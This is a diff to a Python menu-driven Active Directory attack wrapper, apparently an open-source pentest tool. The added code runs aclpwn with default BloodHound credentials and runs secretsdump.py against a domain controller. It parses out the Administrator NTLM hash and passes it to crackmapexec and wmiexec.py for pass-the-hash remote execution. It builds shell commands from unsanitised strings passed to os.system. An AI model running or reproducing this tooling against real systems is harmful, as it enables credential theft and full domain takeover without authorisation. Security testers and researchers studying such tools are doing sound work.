@@ -79,7 +79,7 @@ def gettime(value):
    return variable
 
 def command(command):
-   print colored("Using Command: " + command + "\n", 'white')	# COMMENT OUT TO STOP DEBUGGING COMMANDS
+#   print colored("Using Command: " + command + "\n", 'white')	# COMMENT OUT TO STOP DEBUGGING COMMANDS
    os.system(command)
    raw_input("\nPress ENTER to continue...")
    return
@@ -194,7 +194,7 @@ def display():
    print u'\u2551'
    
    print u'\u2551' + " IMPERSONATE  " + u'\u2502',
-   if POR == "administrator      ":
+   if POR == "Administrator      ":
       print colored(POR[:COL1],'yellow'),
    else:
       print colored(POR[:COL1],'blue'),
@@ -259,7 +259,7 @@ def display():
    print u'\u2551' + "(4) Re/Set PASSWORD    (14) Get Architecture   (24) Services  (34) RpcDump        (44) GetAdUsers     (54) BLANK        (64) WinRem " + u'\u2551'
    print u'\u2551' + "(5) Re/Set FOREST NAME (15) Fierce DNS SERVER  (25) AtExec    (35) Reg            (45) KerbCheckUsers (55) BLANK        (65) BLANK  " + u'\u2551'
    print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) DcomExec  (36) SmbClient      (46) GetNpUsers     (56) BLANK        (66) BLANK  " + u'\u2551'
-   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap Subdomains    (27) PsExec    (37) SmbMap SHARE   (47) SecretsDump    (57) BLANK        (67) BLANK  " + u'\u2551'
+   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap Subdomains    (27) PsExec    (37) SmbMap SHARE   (47) BLANK          (57) BLANK        (67) BLANK  " + u'\u2551'
    print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) SmbExec   (38) SmbMount SHARE (48) WinDapSearch   (58) BLANK        (68) BLANK  " + u'\u2551'
    print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) WmiExec   (39) Enum4Linux     (49) LdapDomainDump (59) BLANK        (69) BLANK  " + u'\u2551'
    print u'\u255A' + (u'\u2550')*132 + u'\u255D'
@@ -315,6 +315,12 @@ if not os.path.exists("users.txt"):		# HOLDS CURRENT FILTERED USER LIST
 else:
    print "[-] File users.txt already exists..."
 
+if not os.path.exists("SECRETS.tmp"):		# HOLDS INITIAL SECRETS DATA
+   os.system("touch SECRETS.tmp")
+   print "[-] File SECRETS.tmp created..."
+else:
+   print "[-] File SECRETS.tmp already exists..."
+
 print "[-] Populating system variables..."
 
 COL1 = 19
@@ -362,7 +368,8 @@ US   = [X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,
 PA   = [X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2] # 40 PASSWORDS
 MAX  = 39
 
-PA[0] = "32693b11e6aa90eb43d32c72a07ceea6" # TEMPORY ASSIGNED VARIABLE WHILE TESTING
+BH1 = "neo4j"		# TEMP
+BH2 = "neo4j"		# TEMP
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -382,7 +389,7 @@ if not os.path.exists('config.txt'):
    HST  = "EMPTY              " # DOMAIN NAME
    WGRP = "EMPTY              " # WORK GROUP
    HIP  = "EMPTY              " # CURRENT SHARE
-   POR  = "administrator      " # IMPERSONATE
+   POR  = "Administrator      " # IMPERSONATE
    PRM  = "'dir -FORCE'       " # WIN COMMAND                                            
    PI1  = "00:00              " # LOCAL TIME    
    DIR  = "WORKAREA           " # DIRECTORY
@@ -458,6 +465,11 @@ while True:
       os.system("echo " + tmp + " >> config.txt")  
       os.system("echo " + PI1  + " >> config.txt")  
       os.system("echo " + DIR  + " >> config.txt")  
+      
+      os.remove("SECRETS.tmp")
+      os.remove("SHARES.tmp")
+      os.remove("USERS.tmp")
+      os.remove("users.txt")
 
       exit(1)
 
@@ -1139,7 +1151,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='45':
+   if selection == '45':
       print "\nPlease wait..."
       os.remove("USERS.tmp")	# CLEAR WORK FILE
       os.system("nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.tmp")
@@ -1192,12 +1204,12 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - secretsdump.py domain/user:PAS@ip
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='47':
-      command(PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
+      exit(1)
 
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1232,40 +1244,66 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='50':
-      exit(1) 
+      print "\nBLOODHOUND NEEDS TO BE RUNNING AND CONFIGURED FOR THIS TO WORK...\n"
+      command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + HST.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - YOU NEED TO SUCCESFULLY RUN 50 ABOVE FIRST TO WORK!!!
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='51':
-      exit(1)       
+      os.remove("SECRETS.tmp")
+      os.system(PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> SECRETS.tmp")
+      command("cat SECRETS.tmp")
+      os.system("sed -i -n '/Administrator/p' SECRETS.tmp")	# SELECT ONLY ADMINISTRATOR
+      HASH = linecache.getline('SECRETS.tmp', 1)
+      HASH = HASH.replace (":"," ")
+      HASH = HASH.rstrip(" ")
+      os.system("echo '" + HASH.rstrip(" ") + "' >> SECRETS2.tmp")
+      os.system("awk 'NF>1{print $NF}' < SECRETS2.tmp > HASH.tmp")
+      os.remove("SECRETS2.tmp")
+      HASH = linecache.getline('HASH.tmp', 1)
+      os.system("mv HASH.tmp SECRETS.tmp")
+      HASH = HASH.rstrip("\n")
+      HASH = padding(HASH, COL4)
+
+      for x in range (0,MAX):
+         if US[x].rstrip(" ") == "Administrator":
+            PA[x] = HASH
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - TEMP PA[0] = needs more refining!!
+# Details : Menu option selected - HASH NEEDS TO EXIST
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='52':
-      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + POR.strip(" ") + " -H " + PA[0] + " -x 'net user Administrator /domain' --exec-method smbexec")
+      for x in range (0,MAX):
+         if US[x].rstrip(" ") == POR.rstrip(" "):
+            HASHED = PA[x].rstrip(" ")
+
+      command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + POR.rstrip(" ") + " -H " + HASHED + " -x 'net user Administrator /domain' --exec-method smbexec")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - HASH NEEDS TO EXIST
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
-      command(PRO + "wmiexec.py -hashes :" + PA[0] + " administrator@" + TIP.rstrip(" "))
+      for x in range (0,MAX):
+         if US[x].rstrip(" ") == POR.rstrip(" "):
+            HASHED = PA[x].rstrip(" ")
+
+      command(PRO + "wmiexec.py -hashes :" + HASHED + " administrator@" + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
